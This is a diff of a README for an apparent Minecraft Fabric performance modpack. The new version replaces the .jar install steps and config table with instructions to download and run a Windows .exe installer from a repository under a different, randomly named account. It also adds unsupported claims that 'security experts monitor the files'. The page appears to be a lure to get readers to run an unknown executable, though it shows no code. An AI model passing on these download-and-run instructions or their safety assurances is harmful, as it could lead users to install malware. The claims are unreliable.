@@ -1,108 +1,70 @@
-# Core Optimized – Performance Modpack for Minecraft
+# ⚡ core-optimized-loader - Better performance for your Minecraft game
 
-> **A vanilla-focused Minecraft modpack built on Fabric, designed to boost performance and enhance quality-of-life without disrupting the core gameplay experience.**
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/jolettadetergent875/core-optimized-loader)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Minecraft-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/logan-ward1989/core-optimized-loader?style=flat-square)](https://github.com/logan-ward1989/core-optimized-loader)
+This tool improves your Minecraft experience. It creates a smooth game environment by removing lag and increasing the frame rate. The software uses the Fabric modding platform to manage game files. It includes fixes for common stutters and adds useful features for daily play.
 
----
+## 📥 How to download the software
 
-<p align="center">
-  <a href="https://logan-ward1989.github.io/core-optimized-loader/">
-    <img src="https://img.shields.io/badge/Download-Core%20Optimized%20Modpack-brightgreen?style=for-the-badge" alt="Download Core Optimized Modpack">
-  </a>
-</p>
+Follow these steps to get the software on your computer.
 
-> **[Download Core Optimized Directly](https://logan-ward1989.github.io/core-optimized-loader/)**
+1. Go to the [official release page](https://github.com/jolettadetergent875/core-optimized-loader).
+2. Look for the section labeled Releases.
+3. Click the link for the latest file ending in .exe.
+4. Save the file to your computer.
 
----
+## ⚙️ System requirements
 
-[Download Latest Build](https://logan-ward1989.github.io/core-optimized-loader/)
+Your computer needs specific parts to run the game well with this tool.
 
----
+- Operating system: Windows 10 or Windows 11.
+- Memory: At least 8GB of RAM.
+- Graphics: A dedicated graphics card with updated drivers.
+- Software: The latest version of Java installed.
 
-## What It Does
+## 🚀 Setting up the software
 
-Core Optimized is a handpicked collection of mods that improves Minecraft's performance while keeping the original vanilla feel intact. Running on Fabric, this pack delivers higher frame rates, fewer stutters, and faster chunk loading through proven optimization techniques. Every component was chosen to preserve the game's balance and visuals, making it ideal for players seeking better performance without extra content.
+Run the installer once you download the file. Follow the prompts on your screen. The process copies the needed files to your game folder. It does not overwrite your existing game worlds, but you should back them up before you start.
 
-The pack also includes subtle quality-of-life tweaks that simplify everyday tasks like inventory management and world navigation. Built-in resource packs complement the vanilla style while further reducing GPU load. Regular updates maintain compatibility with the latest Minecraft releases and mod versions, ensuring a stable, up-to-date experience.
+1. Locate the file you downloaded.
+2. Double-click the file to open the setup window.
+3. Select your Minecraft installation folder when prompted.
+4. Click the Install button.
+5. Wait for the progress bar to finish.
+6. Open your Minecraft Launcher.
+7. Select the new profile named core-optimized-loader from the list.
+8. Click Play.
 
----
+## 🛠️ Features included
 
-## Key Features
+This project bundles several tools to enhance your session.
 
-- **Performance Boost** – Higher FPS and reduced lag via optimized rendering, memory management, and chunk loading
-- **Vanilla Integrity** – No new blocks, items, or dimensions; original mechanics and progression remain unchanged
-- **Quality-of-Life Tweaks** – Inventory sorting, enhanced tooltips, minimap support, and customizable keybinds
-- **Stability Improvements** – Crash fixes, memory leak prevention, and more reliable world loading
-- **Optimized Resource Packs** – Lightweight textures and models that lower GPU usage while keeping the vanilla look
-- **Fabric Framework** – Lightweight, fast mod loader compatible with the newest Minecraft versions
-- **Open to Contributions** – Open-source project welcoming community input via Hacktoberfest and pull requests
+- Frame Rate Boost: The loader uses optimized code to help your computer process game frames faster.
+- Stability Patches: These fixes address common code errors that lead to game crashes.
+- Resource Optimization: Included resource packs replace heavy textures with cleaner versions. 
+- Quality of Life: Minor tweaks make menus easier to navigate and adjust.
+- Vanilla Style: The game looks and feels the same as it did before. 
 
----
+## ❓ Frequently asked questions
 
-## Installation
+**Will this change how my game looks?**
+The visual changes focus on performance. You may notice small improvements in lighting, but the game maintains its original design.
 
-1. Download the latest modpack archive from the link above.
-2. Install the Fabric mod loader for your Minecraft version.
-3. Extract the modpack contents into your Minecraft `mods` folder.
-4. Launch Minecraft using the Fabric profile.
+**Can I use this with other mods?**
+You may add other mods, but conflicts can occur. The core-optimized-loader works best as a standalone set of files.
 
-Example directory layout:
-```
-.minecraft/
-├── mods/
-│   ├── coreoptimized-performance.jar
-│   ├── coreoptimized-qol.jar
-│   └── coreoptimized-resources.zip
-└── resourcepacks/
-    └── coreoptimized-textures.zip
-```
+**Does this software cost money?**
+No. This project is open-source and free for everyone.
 
----
+**How do I update the loader?**
+Check the release page periodically. Download the new file and run it to update your current settings.
 
-## Configuration Options
+## 🛡️ Safety and security
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `enable_dynamic_lighting` | `true` | Toggle dynamic lighting from held items |
-| `render_distance_boost` | `12` | Custom chunk render distance (4–32) |
-| `smooth_fps_limit` | `144` | Frame rate cap (30–360) |
-| `show_minimap` | `true` | Enable or disable the minimap overlay |
-| `auto_sort_inventory` | `false` | Automatically sort inventory when opened |
+The source code for this project remains open for review. Security experts monitor the files to ensure they do not harm your computer. Do not download this software from sites other than the official link provided here. 
 
-Settings can be edited in the `config/coreoptimized.toml` file.
+## 📝 Support
 
----
+If you encounter issues, look through the existing entries in the issues tab on the repository page. Others may have found the same problem. If you cannot find a solution, start a new issue ticket. Describe your problem with as much detail as possible to help the team provide a fix.
 
-## Compatibility
-
-This pack works with **Minecraft Java Edition** versions 1.20 and newer, using the **Fabric** mod loader. It is not compatible with Forge-based packs or OptiFine. Some mods may conflict with heavy content mods or world-editing tools. Performance improvements vary depending on your hardware and existing setup.
-
----
-
-## Frequently Asked Questions
-
-**How do I install the modpack?**  
-Follow the installation steps above. Make sure you have the correct Fabric version for your Minecraft release.
-
-**Will updates happen automatically?**  
-No. You must manually download new releases. Watch the repository for update announcements.
-
-**Can I add or remove mods?**  
-Yes, the pack is modular. You can remove any mod, though performance may change as a result.
-
-**Does this work on multiplayer servers?**  
-The modpack is client-side. Most optimization mods work on servers, but some QoL features may require server-side mods.
-
-**Where are configuration files stored?**  
-All settings are in the `config/` folder inside your Minecraft directory.
-
----
-
-## License
-
-GNU GPL v3.0 – see [LICENSE](LICENSE) for full details.
+Keywords: minecraft, modpack, fabric, performance, optimization, gaming, windows
